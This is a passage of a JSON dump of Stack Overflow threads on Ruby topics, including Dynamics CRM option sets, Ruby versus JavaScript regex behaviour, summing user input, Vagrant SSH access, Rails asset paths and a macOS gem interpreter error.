<code>\"2\"</code>, let <code>@x</code> = <code>1</code></li>\n<li>If the final character is <code>\"3\"</code>, let <code>@x</code> = <code>2</code></li>\n</ul>\n"}, {"tags": ["ruby-on-rails", "ruby", "dynamics-crm"], "answers": [{"tags": [], "owner": {"reputation": 20105, "user_id": 7920473, "user_type": "registered", "accept_rate": 89, "profile_image": "https://graph.facebook.com/10155688613669453/picture?type=large", "display_name": "Arun Vinoth", "link": "https://stackoverflow.com/users/7920473/arun-vinoth"}, "is_accepted": false, "score": 0, "last_activity_date": 1511962196, "creation_date": 1511962196, "answer_id": 47554040, "question_id": 47549092, "link": "https://stackoverflow.com/questions/47549092/how-to-deal-with-option-set-in-dynamics-crm-api/47554040#47554040", "title": "How to deal with option set in Dynamics CRM API?", "body": "<p>It should be <code>new OptionSetValue(115170001)</code> in native CRM Sdk. </p>\n\n<p>When I checked the below implementation in git <code>client.rb</code> file, I feel it\u2019s missing.</p>\n\n<pre><code># These are all the operations defined by the Dynamics WSDL.\n# Tag names are case-sensitive.\ndef create(entity_name, attributes)\n  entity = XML::Entity.new(entity_name)\n  entity.attributes = XML::Attributes.new(attributes)\n\n  xml_response = post(organization_endpoint, create_request(entity))\n  Response::CreateResult.new(xml_response)\nend\n</code></pre>\n\n<p>You may fork it to add this or reach out to the contributors.</p>\n"}, {"tags": [], "owner": {"reputation": 11, "user_id": 8557714, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77f3aa66b1be22104b995ae4263062af?s=128&d=identicon&r=PG&f=1", "display_name": "Ayter", "link": "https://stackoverflow.com/users/8557714/ayter"}, "is_accepted": true, "score": 0, "last_activity_date": 1512125226, "last_edit_date": 1512125226, "creation_date": 1512056945, "answer_id": 47577352, "question_id": 47549092, "link": "https://stackoverflow.com/questions/47549092/how-to-deal-with-option-set-in-dynamics-crm-api/47577352#47577352", "title": "How to deal with option set in Dynamics CRM API?", "body": "<p>Okay, i finally found the solution.</p>\n\n<p>It works with : </p>\n\n<p><code>client.create('contact', lastname: 'test', neos_titre: {type: \"OptionSetValue\", value: 115170000})</code></p>\n\n<p>Thanks everybody</p>\n"}], "owner": {"reputation": 11, "user_id": 8557714, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/77f3aa66b1be22104b995ae4263062af?s=128&d=identicon&r=PG&f=1", "display_name": "Ayter", "link": "https://stackoverflow.com/users/8557714/ayter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 134, "favorite_count": 0, "accepted_answer_id": 47577352, "answer_count": 2, "score": 0, "last_activity_date": 1512125226, "creation_date": 1511947177, "last_edit_date": 1511948297, "question_id": 47549092, "link": "https://stackoverflow.com/questions/47549092/how-to-deal-with-option-set-in-dynamics-crm-api", "title": "How to deal with option set in Dynamics CRM API?", "body": "<p>I'm using this <a href=\"https://github.com/TinderBox/dynamics_crm\" rel=\"nofollow noreferrer\">gem</a> to connect my platform to the Dynamics CRM API. \nI have an attribute <code>neos_titre</code> which is the civility of my users, in Dynamics this attribute is an <code>OptionSet</code> and it need to be set by an integer. \nBut create a user with :</p>\n\n<p><code>client.create('contact', firstname: 'test', neos_titre: 115170001)</code></p>\n\n<p>returns following error :</p>\n\n<p><code>DynamicsCRM::XML::Fault: s:Sender[] Incorrect attribute value type System.Int32</code></p>\n\n<p>So I don't know how to set this value, can someone help me ?</p>\n"}, {"tags": ["javascript", "ruby", "regex"], "comments": [{"owner": {"reputation": 481662, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 45516, "user_id": 838807, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/372d495ca83f81cfadb782894ee41b17?s=128&d=identicon&r=PG", "display_name": "musefan", "link": "https://stackoverflow.com/users/838807/musefan"}, "edited": false, "score": 0, "creation_date": 1511947615, "post_id": 47548744, "comment_id": 82054960, "body": "@musefan <code>match</code> only returns a single match."}, {"owner": {"reputation": 45516, "user_id": 838807, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/372d495ca83f81cfadb782894ee41b17?s=128&d=identicon&r=PG", "display_name": "musefan", "link": "https://stackoverflow.com/users/838807/musefan"}, "reply_to_user": {"reputation": 481662, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1511947987, "post_id": 47548744, "comment_id": 82055230, "body": "@WiktorStribi\u017cew: I don&#39;t know ruby, I just <a href=\"https://stackoverflow.com/questions/7993662/whats-the-difference-between-scan-and-match-on-ruby-string\">seen this</a> and thought it looked correct, but on second look it seems you are correct"}], "answers": [{"comments": [{"owner": {"reputation": 481662, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511947361, "post_id": 47548987, "comment_id": 82054770, "body": "@mudasobwa Yeah, this shorthand will make it shorter. Just in case anyone wants to have some &quot;technical&quot; access to the second capturing group, the expanded version might still be of value."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 1, "creation_date": 1511947825, "post_id": 47548987, "comment_id": 82055107, "body": "The expanded version should be <code>&quot;!!!??&quot;.scan(&#47;(([?!])\\2*)&#47;).inject({}) { |acc, (m, _)| acc &lt;&lt; m }</code> without leaking an accumulator to the global space with a local variable :)"}, {"owner": {"reputation": 481662, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511948048, "post_id": 47548987, "comment_id": 82055266, "body": "@mudasobwa That is interesting. I followed <a href=\"https://stackoverflow.com/a/39386386/3832970\">this answer</a> when posting, and I bet you could say the same about that one, right?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511948264, "post_id": 47548987, "comment_id": 82055417, "body": "Yes. And we can summon @Stefan to confirm :)"}], "tags": [], "owner": {"reputation": 481662, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "is_accepted": true, "score": 2, "last_activity_date": 1511948574, "last_edit_date": 1511948574, "creation_date": 1511946845, "answer_id": 47548987, "question_id": 47548744, "link": "https://stackoverflow.com/questions/47548744/different-and-same-regex-in-ruby-and-js-on-the-same-input/47548987#47548987", "title": "Different and same Regex in Ruby and JS on the same input", "body": "<p>Since <a href=\"http://ruby-doc.org/core-2.4.0/String.html#method-i-scan\" rel=\"nofollow noreferrer\"><code>scan</code></a> only returns captured substrings when capturing group(s) is/are defined in the pattern, you should modify the pattern to capture the whole match and add some more Ruby code (edited <a href=\"https://stackoverflow.com/questions/47548744/different-and-same-regex-in-ruby-and-js-on-the-same-input/47548987?noredirect=1#comment82055107_47548987\">as per this comment</a>):</p>\n\n<pre><code>s=\"!!!??\"\nmatches = s.scan(/(([?!])\\2*)/).inject([]) { |acc, (m, _)| acc &lt;&lt; m }\nputs matches\n# = ['!!!', '??']\n</code></pre>\n\n<p>See the <a href=\"https://ideone.com/LBr98Y\" rel=\"nofollow noreferrer\">online Ruby demo</a>. </p>\n\n<p>As per <a href=\"https://stackoverflow.com/questions/47548744/different-and-same-regex-in-ruby-and-js-on-the-same-input/47548987#comment82054608_47548987\">@mudasobwa's comment</a>, you may even contract that to </p>\n\n<pre><code>\"!!!??\".scan(/(([?!])\\2*)/).map(&amp;:first)\n</code></pre>\n\n<p>Here, <code>(([?!])\\2*)</code> matches the same texts as <code>/([?!])\\1*/</code>, but since the whole pattern is wrapped with capturing parentheses, the backreference to the <code>?</code> or <code>!</code> now has ID=2, hence <code>\\1</code> turns into <code>\\2</code>. Inside the block, there is access to both the captured values via <code>m</code> (the whole match) and <code>n</code> (<code>?</code> or <code>!</code>). We are only collecting whole matches, hence <code>m</code> is added to <code>matches</code> upon each match.</p>\n"}], "owner": {"reputation": 797, "user_id": 8574922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://lh5.googleusercontent.com/-H7r02ZlEyhE/AAAAAAAAAAI/AAAAAAAAAPc/RiIKejtdmws/photo.jpg?sz=128", "display_name": "Dmitry Dmitriev", "link": "https://stackoverflow.com/users/8574922/dmitry-dmitriev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 77, "favorite_count": 0, "accepted_answer_id": 47548987, "answer_count": 1, "score": 1, "last_activity_date": 1569522803, "creation_date": 1511946079, "last_edit_date": 1569522803, "question_id": 47548744, "link": "https://stackoverflow.com/questions/47548744/different-and-same-regex-in-ruby-and-js-on-the-same-input", "title": "Different and same Regex in Ruby and JS on the same input", "body": "<p>This is the input line <code>\"!!!??\"</code></p>\n\n<p>FIRST regex works similar in Ruby and JS and do what it need to do split this input for two lines contains \"!\" and \"?\" respectively:</p>\n\n<p><strong>Example #1 ruby like js</strong> <code>/!+|\\?+/g</code></p>\n\n<p>RUBY <code>s.scan(/!+|\\?+/).inspect</code> works like as  JS <code>s.match(/!+|\\?+/g)</code>. \nAnd output is: RUBY <code>[ '!!!', '??' ]</code>, JS <code>[\\\"!!!\\\", \\\"??\\\"]</code></p>\n\n<p><strong>Example #2 ruby is not js</strong> <code>/([?!])\\1*/</code></p>\n\n<p>Here ruby and js have different behavior \nRUBY <code>s.scan(/([?!])\\1*/)</code> not equal to JS <code>s.match(/([?!])\\1*/g)</code>.\nRUBY returns two arrays <code>[[\\\"!\\\"], [\\\"?\\\"]]</code>. \nJS returns two strings as like as in the Example #1 <code>[ '!!!', '??' ]</code>.</p>\n\n<p>Why <code>/([?!])\\1*/</code> acts different in Ruby and JS?</p>\n\n<p>code <a href=\"https://goo.gl/\" rel=\"nofollow noreferrer\">https://goo.gl/</a></p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 61438, "user_id": 63034, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/ZXKMO.jpg?s=128&g=1", "display_name": "mikej", "link": "https://stackoverflow.com/users/63034/mikej"}, "edited": false, "score": 4, "creation_date": 1511944569, "post_id": 47548233, "comment_id": 82053048, "body": "The numbers from <code>gets</code> aren&#39;t numbers, they&#39;re strings :) Add a <code>to_i</code> e.g. <code>arr &lt;&lt; input.to_i</code>"}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "reply_to_user": {"reputation": 61438, "user_id": 63034, "user_type": "registered", "accept_rate": 57, "profile_image": "https://i.stack.imgur.com/ZXKMO.jpg?s=128&g=1", "display_name": "mikej", "link": "https://stackoverflow.com/users/63034/mikej"}, "edited": false, "score": 1, "creation_date": 1511945155, "post_id": 47548233, "comment_id": 82053408, "body": "@mikej Or <code>arr.sum(&amp;:to_i)</code>."}, {"owner": {"reputation": 24179, "user_id": 1672429, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/0815eb7d4e9dd58022d51ba2011b9c0a?s=128&d=identicon&r=PG", "display_name": "Stefan Pochmann", "link": "https://stackoverflow.com/users/1672429/stefan-pochmann"}, "edited": false, "score": 0, "creation_date": 1511945504, "post_id": 47548233, "comment_id": 82053623, "body": "(Although if their Ruby is new enough for that, then they could just do <code>input.to_i</code> and <code>.sum</code>. But I like <code>.sum(&amp;:...)</code> so much :-)"}, {"owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "edited": false, "score": 0, "creation_date": 1511947282, "post_id": 47548233, "comment_id": 82054725, "body": "sum is a Rails function, it is not in plain ruby. <a href=\"https://apidock.com/rails/Enumerable/sum\" rel=\"nofollow noreferrer\">apidock.com/rails/Enumerable/sum</a>"}, {"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "reply_to_user": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "edited": false, "score": 0, "creation_date": 1511950865, "post_id": 47548233, "comment_id": 82057233, "body": "@Juan <a href=\"http://ruby-doc.org/core-2.4.2/Array.html#method-i-sum\" rel=\"nofollow noreferrer\">au contraire</a>."}, {"owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "reply_to_user": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 0, "creation_date": 1511958013, "post_id": 47548233, "comment_id": 82061881, "body": "@SagarPandya oh yeah they added it in ruby 2.4.0...."}], "answers": [{"tags": [], "owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "is_accepted": false, "score": 1, "last_activity_date": 1511945230, "creation_date": 1511945230, "answer_id": 47548502, "question_id": 47548233, "link": "https://stackoverflow.com/questions/47548233/returning-the-sum-of-a-users-input-until-they-say-stop/47548502#47548502", "title": "returning the sum of a users input until they say stop", "body": "<p>It is the combination of</p>\n\n<pre><code>arr &lt;&lt; input\n</code></pre>\n\n<p>and</p>\n\n<pre><code>arr.inject(:+)\n</code></pre>\n\n<p>For example, if you change the first one to:</p>\n\n<pre><code>arr &lt;&lt; input.to_i\n</code></pre>\n\n<p>then it would not be wrong any more.</p>\n"}, {"tags": [], "owner": {"reputation": 616, "user_id": 2675376, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000498640121/picture?type=large", "display_name": "Juan Manuel Rodulfo Salcedo", "link": "https://stackoverflow.com/users/2675376/juan-manuel-rodulfo-salcedo"}, "is_accepted": true, "score": 3, "last_activity_date": 1511947082, "creation_date": 1511947082, "answer_id": 47549066, "question_id": 47548233, "link": "https://stackoverflow.com/questions/47548233/returning-the-sum-of-a-users-input-until-they-say-stop/47549066#47549066", "title": "returning the sum of a users input until they say stop", "body": "<pre><code>arr.inject(0) { |sum,e| sum + e.to_i }\n</code></pre>\n\n<p>a bit more verbose but your problem is that reading from input == String and you want Integer.</p>\n\n<p>Other solution could be</p>\n\n<pre><code>arr.map(&amp;:to_i).inject(:+)\n</code></pre>\n\n<p>But the first one is more efficient but less fancy.</p>\n"}], "owner": {"reputation": 69, "user_id": 8041945, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/e11758949228df43138240ec1e7b9bdf?s=128&d=identicon&r=PG&f=1", "display_name": "LewMoore", "link": "https://stackoverflow.com/users/8041945/lewmoore"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 520, "favorite_count": 0, "accepted_answer_id": 47549066, "answer_count": 2, "score": 0, "last_activity_date": 1511947082, "creation_date": 1511944300, "question_id": 47548233, "link": "https://stackoverflow.com/questions/47548233/returning-the-sum-of-a-users-input-until-they-say-stop", "title": "returning the sum of a users input until they say stop", "body": "<p>I am trying to create something that constantly takes a users input until they say stop. Then, add all of the previous numbers together. This is what I have so far:</p>\n\n<pre><code>arr = []\n\nputs \"Give me a number:\"\nwhile input = gets.chomp\n  if input == \"stop\"\n    break\n  else\n    puts \"Give me a number:\"\n    arr &lt;&lt; input\n  end\nend\n\nsum = arr.inject(:+)\nputs sum\n</code></pre>\n\n<p>This is working fine up until adding the numbers together. The arr.inject(:+) seems to be joining the numbers together rather than adding.</p>\n\n<p>For example, when in the while loop, I am entering 1, 2 and 3 into the gets.chomp, but the program is returning 123 rather that 6.</p>\n\n<p>Where am I going wrong?</p>\n"}, {"tags": ["javascript", "ruby", "vagrant"], "answers": [{"tags": [], "owner": {"reputation": 787, "user_id": 8204677, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/006b49495435e44fef565f3dcba2ab75?s=128&d=identicon&r=PG&f=1", "display_name": "darclander", "link": "https://stackoverflow.com/users/8204677/darclander"}, "is_accepted": true, "score": 0, "last_activity_date": 1511955682, "creation_date": 1511955682, "answer_id": 47551971, "question_id": 47547927, "link": "https://stackoverflow.com/questions/47547927/autorun-file-when-you-connect-to-vagrant-server/47551971#47551971", "title": "Autorun file when you connect to vagrant server", "body": "<p>I found how to connect to the server remotely via the vagrant environment using <code>ssh vagrant@192.168.x.x</code> where the x.x is the ip of the local computer. </p>\n\n<p>Example</p>\n\n<p>IP to the vagrant server is 192.168.192.192\nOn my main computer I run the command <code>ssh vagrant@192.168.192.192</code> and I login with the default password.</p>\n"}], "owner": {"reputation": 787, "user_id": 8204677, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/006b49495435e44fef565f3dcba2ab75?s=128&d=identicon&r=PG&f=1", "display_name": "darclander", "link": "https://stackoverflow.com/users/8204677/darclander"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "accepted_answer_id": 47551971, "answer_count": 1, "score": 1, "last_activity_date": 1511955682, "creation_date": 1511943150, "last_edit_date": 1511943491, "question_id": 47547927, "link": "https://stackoverflow.com/questions/47547927/autorun-file-when-you-connect-to-vagrant-server", "title": "Autorun file when you connect to vagrant server", "body": "<p>I am currently working on a server where I want to autorun a file whenever I connect to the server myself. Example; I start the server and when I connect to it I want it to run a backup. My server is running on another computer and I connect to it from my main computer to save performance. The thing is that I also want to be able to work inside the server from my main computer. Example; The server is running on PC1 and I want to have access to the server from PC2 via vagrant.</p>\n\n<p>The server is run by vagrant.</p>\n\n<p>I have some experience within - Ruby, C++, Vagrant, javascript and SQL if this is helpful for the answer.</p>\n"}, {"tags": ["ruby-on-rails", "ruby"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 7, "creation_date": 1511939002, "post_id": 47546843, "comment_id": 82050236, "body": "If you were brave enough to violate rails naming conventions, you should be a hero figuring out all the consequences yourself."}, {"owner": {"reputation": 11, "user_id": 5288514, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/kWstZ.jpg?s=128&g=1", "display_name": "Asad", "link": "https://stackoverflow.com/users/5288514/asad"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1511939815, "post_id": 47546843, "comment_id": 82050641, "body": "Soory don&#39;t understand what you say"}], "answers": [{"tags": [], "owner": {"reputation": 326, "user_id": 3013354, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ad9dbf3df6d9dc0944bb224014a3bc2b?s=128&d=identicon&r=PG", "display_name": "nekogami", "link": "https://stackoverflow.com/users/3013354/nekogami"}, "is_accepted": false, "score": 0, "last_activity_date": 1511943274, "creation_date": 1511943274, "answer_id": 47547948, "question_id": 47546843, "link": "https://stackoverflow.com/questions/47546843/how-to-give-image-path-in-ruby-on-rails/47547948#47547948", "title": "How to give image path in ruby on rails", "body": "<p>I think what you need is the helper asset_url</p>\n\n<p><a href=\"http://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-asset_url\" rel=\"nofollow noreferrer\">http://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-asset_url</a></p>\n\n<p>But you would strongly advise you to use the default folder if you want to do that.</p>\n\n<p>@mudasobwa While it's true, you don't have to be such a d..k in your reply :/. It's not as if we never coded shit when discovering new languages / libs / concepts</p>\n\n<p>@Gagan Gami\nYou could, but you would then avoid the asset pipeline and are going to have a huge cache problem with your browser the day you replace your file while keeping the name.</p>\n"}, {"comments": [{"owner": {"reputation": 43225, "user_id": 297087, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/17b3a5816f0647e9b0f7c49d60f93e7b?s=128&d=identicon&r=PG", "display_name": "Salil", "link": "https://stackoverflow.com/users/297087/salil"}, "edited": false, "score": 1, "creation_date": 1511945382, "post_id": 47548452, "comment_id": 82053551, "body": "Add <code>config.assets.paths &lt;&lt; Rails.root.join(&quot;app&#47;assets&quot;, &#39;images&#47;revolution&#39;)</code> in application.rb &amp; then <code>&lt;%= image_tag(&#39;01.png&#39;) %&gt;</code>"}, {"owner": {"reputation": 1308, "user_id": 3759158, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/70BLw.jpg?s=128&g=1", "display_name": "Manishh", "link": "https://stackoverflow.com/users/3759158/manishh"}, "reply_to_user": {"reputation": 43225, "user_id": 297087, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/17b3a5816f0647e9b0f7c49d60f93e7b?s=128&d=identicon&r=PG", "display_name": "Salil", "link": "https://stackoverflow.com/users/297087/salil"}, "edited": false, "score": 0, "creation_date": 1511945587, "post_id": 47548452, "comment_id": 82053669, "body": "@Salil His revolution folder is not in images."}], "tags": [], "owner": {"reputation": 1308, "user_id": 3759158, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/70BLw.jpg?s=128&g=1", "display_name": "Manishh", "link": "https://stackoverflow.com/users/3759158/manishh"}, "is_accepted": false, "score": 2, "last_activity_date": 1511945506, "last_edit_date": 1511945506, "creation_date": 1511945072, "answer_id": 47548452, "question_id": 47546843, "link": "https://stackoverflow.com/questions/47546843/how-to-give-image-path-in-ruby-on-rails/47548452#47548452", "title": "How to give image path in ruby on rails", "body": "<p>You need to put that revolution folder in assets path first then you will be able access files from it.</p>\n\n<pre><code>config.assets.paths &lt;&lt; Rails.root.join(\"app/assets\", 'revolution')\n</code></pre>\n\n<p>Than only you will be able to access file from assets path like below.</p>\n\n<pre><code>&lt;%= image_tag('01.png') %&gt;\n</code></pre>\n\n<p>If you do not want to put your folder in assets images path. We have 2 ways of doing same. Either move your folder to assets/images or to public path (rails ways) in both way you can easily access file.</p>\n"}], "owner": {"reputation": 11, "user_id": 5288514, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/kWstZ.jpg?s=128&g=1", "display_name": "Asad", "link": "https://stackoverflow.com/users/5288514/asad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1461, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1511949089, "creation_date": 1511938844, "last_edit_date": 1511949089, "question_id": 47546843, "link": "https://stackoverflow.com/questions/47546843/how-to-give-image-path-in-ruby-on-rails", "title": "How to give image path in ruby on rails", "body": "<p>I want to use an image that is located in <code>app/assets/revolution/assets/01.png</code>. </p>\n\n<p>I'm not using the by default <code>app/assets/images</code> folder. I want to use my own folder name <code>'revolution'</code> where I'v made my own <code>assets</code> folder. </p>\n\n<p>How do I give the image path in my index view? I'm trying to do it like this:</p>\n\n<pre><code>&lt;%= image_tag ('revolution/assets/01.png') %&gt;\n</code></pre>\n"}, {"tags": ["ruby", "macos", "rubygems", "bundler", "macos-high-sierra"], "answers": [{"tags": [], "owner": {"reputation": 1118, "user_id": 1141984, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f7d84f77309eef4be8d0d897b858f3dc?s=128&d=identicon&r=PG", "display_name": "Calahad", "link": "https://stackoverflow.com/users/1141984/calahad"}, "is_accepted": true, "score": 5, "last_activity_date": 1511938426, "creation_date": 1511938426, "answer_id": 47546744, "question_id": 47546743, "link": "https://stackoverflow.com/questions/47546743/bash-usr-local-bin-pod-system-library-frameworks-ruby-framework-versions-2/47546744#47546744", "title": "-bash: /usr/local/bin/pod: /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby: bad interpreter: No such file or directory", "body": "<p>This seems to affect all gems, <a href=\"https://github.com/CocoaPods/CocoaPods/issues/6898\" rel=\"noreferrer\">this cocoapods thread</a> gave me the fix:</p>\n\n<pre><code>gem install -n /usr/local/bin bundler\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31, "user_id": 8783490, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7cb6cdcd3eed6681eef5c2f767732e0d?s=128&d=identicon&r=PG&f=1", "display_name": "D.Sho", "link": "https://stackoverflow.com/users/8783490/d-sho"}, "is_accepted": false, "score": 3, "last_activity_date": 1518055520, "last_edit_date": 1518055520, "creation_date": 1518033661, "answer_id": 48672319, "question_id": 47546743, "link": "https://stackoverflow.com/questions/47546743/bash-usr-local-bin-pod-system-library-frameworks-ruby-framework-versions-2/48672319#48672319", "title": "-bash: /usr/local/bin/pod: /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby: bad interpreter: No such file or directory", "body": "<p>Solved the same problem with: </p>\n\n<pre><code>sudo gem install cocoapods\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 1118, "user_id": 1141984, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f7d84f77309eef4be8d0d897b858f3dc?s=128&d=identicon&r=PG", "display_name": "Calahad", "link": "https://stackoverflow.com/users/1141984/calahad"}, "edited": false, "score": 0, "creation_date": 1528104823, "post_id": 48672446, "comment_id": 88364377, "body": "I prefer chruby and ruby-install, however managing ruby versions is very important, that is true."}], "tags": [], "owner": {"reputation": 3412, "user_id": 1470785, "user_type": "registered", "accept_rate": 58, "profile_image": "https://www.gravatar.com/avatar/34f4e40cb4729d55c89a901efd1e2f48?s=128&d=identicon&r=PG", "display_name": "IgnazioC", "link": "https://stackoverflow.com/users/1470785/ignazioc"}, "is_accepted": false, "score": 0, "last_activity_date": 1518034234, "creation_date": 1518034234, "answer_id": 48672446, "question_id": 47546743, "link": "https://stackoverflow.com/questions/47546743/bash-usr-local-bin-pod-system-library-frameworks-ruby-framework-versions-2/48672446#48672446", "title": "-bash: /usr/local/bin/pod: /System/Library/Frameworks/Ruby.framework/Versions/2.0/usr/bin/ruby: bad interpreter: No such file or directory", "body": "<p>strongly recommend to install RVM to manage your ruby versions in your mac.\n<a href=\"https://rvm.io\" rel=\"nofollow noreferrer\">https://rvm.io</a></p>\n"}], "owner": {"reputation": 1118, "user_id": 1141984, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/f7d84f77309eef4be8d0d897b858f3dc?s=128&d=identicon&r=PG", "display_name": "Calahad", "link": "https://stackoverflow.com/users/1141984/calahad"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2684, "favorite_count": 0, "accepted_answer_id": 47546744, "answer_count": 3, "score": 1, "last_activity_date": 1594369123, "creation_date": 1511938426, "question_id": 47546743, "link": "https://stackoverflow.com/questions/47546743/bash-usr-local-bin-pod-system-library-frameworks-ruby-framework-versions-2", "title": "-bash: /usr/local/bin/pod: 